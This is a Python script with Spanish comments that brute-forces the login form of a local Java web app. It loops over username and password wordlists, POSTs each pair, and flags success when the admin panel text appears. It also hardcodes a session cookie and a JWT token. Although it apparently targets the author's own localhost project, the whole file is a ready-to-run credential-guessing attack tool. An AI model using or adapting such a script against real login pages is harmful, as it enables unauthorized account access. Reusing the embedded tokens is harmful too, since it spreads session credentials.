import requests
import argparse

# URL de login de la web
login_url = "http://localhost:8080/ProyectoMaven/LoginGameRetroControlador"
cookies = {
    "JSESSIONID": "A612305B4CFAC081D51A134B97EF2B62",
    "token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoxLCJ1c3VhcmlvIjoidXNlciIsImVtYWlsIjoidXNlckB0ZXN0LmNvbSIsIm5vbWJyZSI6IlVzdWFyaW8iLCJhcGVsbGlkb3MiOiJBcGVsbGlkbyIsImNvb2tpZSI6ImM1Mjc4ZDUwLWFhN2QtNGM2NS1hYWE4LWUwYzFlZmMyMTc1OSIsInJvbCI6InVzZXIiLCJ1bHRpbW9fbG9naW4iOm51bGwsImV4cCI6MTc0NTUyMTgwNn0.hPWhK5D74BZi6mbcK8-VTNn0QscT6460JANYS2omSXs"
}

# Cabecera de la solicitud
headers = {
    "Content-Type": "application/x-www-form-urlencoded"
}

# Función para cargar el diccionario de usuarios desde un archivo
def cargar_usuarios(usuarios_path):
    try:
        with open(usuarios_path, 'r') as file:
            usuarios = [line.strip() for line in file.readlines()]
        return usuarios
    except FileNotFoundError:
        print(f"[ERROR] El archivo de usuarios no se encuentra en la ruta: {usuarios_path}")
        exit(1)

# Función para cargar el diccionario de contraseñas desde un archivo
def cargar_contrasenas(diccionario_path):
    try:
        with open(diccionario_path, 'r') as file:
            contrasenas = [line.strip() for line in file.readlines()]
        return contrasenas
    except FileNotFoundError:
        print(f"[ERROR] El archivo de contraseñas no se encuentra en la ruta: {diccionario_path}")
        exit(1)

# Función para probar las combinaciones de usuario y contraseña
def probar_credenciales(usuario, contrasena):
    # Parámetros para el POST
    body = {
        "username": usuario,
        "password": contrasena
    }

    try:
        # Realizar la solicitud POST con redirección habilitada
        response = requests.post(login_url, cookies=cookies, data=body, headers=headers, allow_redirects=True)

        # Comprobar si hemos sido redirigidos a una página de login
        if "Login Retro 60s" in response.text:
            print(f"[-] Credenciales incorrectas: Usuario: {usuario}, Contraseña: {contrasena}")
        elif "PANEL DE ADMINISTRADOR" in response.text:
            print(f"[+] Credenciales correctas: Usuario: {usuario}, Contraseña: {contrasena}")
            return True  # Si encontramos el panel de administrador, terminamos la búsqueda
        else:
            print(f"[ERROR] Error inesperado: Usuario: {usuario}, Contraseña: {contrasena}, Código: {response.status_code}")

    except requests.exceptions.RequestException as e:
        print(f"[ERROR] Ocurrió un error: {e}")

    return False  # Si no es correcto, devolvemos False

# Probar todas las combinaciones de usuario y contraseña
def probar_combinaciones(usuarios, contrasenas):
    for usuario in usuarios:
        for contrasena in contrasenas:
            if probar_credenciales(usuario, contrasena):
                return  # Detener cuando encontremos credenciales correctas

    print("No se encontraron credenciales válidas.")

# Main
if __name__ == '__main__':
    # Argumentos de la línea de comandos
    parser = argparse.ArgumentParser(
        description="Realiza pruebas de login a una web usando diccionarios de usuarios y contraseñas")

    # Argumento para el archivo de usuarios
    parser.add_argument('-u', '--usuarios', type=str, required=True,
                        help="Ruta al archivo de texto que contiene los usuarios a probar (uno por línea).")

    # Argumento para el archivo de contraseñas
    parser.add_argument('-w', '--contrasenas', type=str, required=True,
                        help="Ruta al archivo de texto que contiene las contraseñas a probar (una por línea).")

    # Parsear los argumentos
    args = parser.parse_args()

    # Cargar usuarios y contraseñas desde los archivos
    usuarios = cargar_usuarios(args.usuarios)
    contrasenas = cargar_contrasenas(args.contrasenas)

    # Ejecutar la prueba de combinaciones
    probar_combinaciones(usuarios, contrasenas)

# python3 .\bruteForce.py -u users.txt -w pass.txt
